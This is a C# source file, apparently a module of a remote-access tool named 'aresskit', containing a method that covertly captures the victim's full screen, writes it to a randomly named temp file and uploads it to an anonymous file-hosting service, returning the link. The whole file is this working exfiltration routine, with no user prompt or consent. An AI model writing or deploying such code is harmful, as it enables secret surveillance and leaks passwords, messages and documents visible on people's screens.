using Newtonsoft.Json;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace aresskit
{
    // Thanks to: http://stackoverflow.com/a/18870847/5925502
    class Stream
    {
        public static string CaptureScreenshot()
        {
            // Capture Screenshot
            Bitmap myImage = Stream.Capture(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            string ImagePath = System.IO.Path.GetTempPath() + Misc.RandomString(16) + ".png";
            myImage.Save(ImagePath, ImageFormat.Png);

            // Upload File to AnonymousFiles
            dynamic json = JsonConvert.DeserializeObject(FileHandler.uploadFile(ImagePath, "https://api.anonymousfiles.io"));
            return json.url;
        }

        private static Bitmap Capture(int x, int y, int width, int height)
        {
            Bitmap screenShotBMP = new Bitmap(width, height, PixelFormat.Format32bppArgb);

            Graphics screenShotGraphics = Graphics.FromImage(screenShotBMP);

            screenShotGraphics.CopyFromScreen(new Point(x, y), Point.Empty, new Size(width, height), CopyPixelOperation.SourceCopy);
            screenShotGraphics.Dispose();

            return screenShotBMP;
        }
    }
}
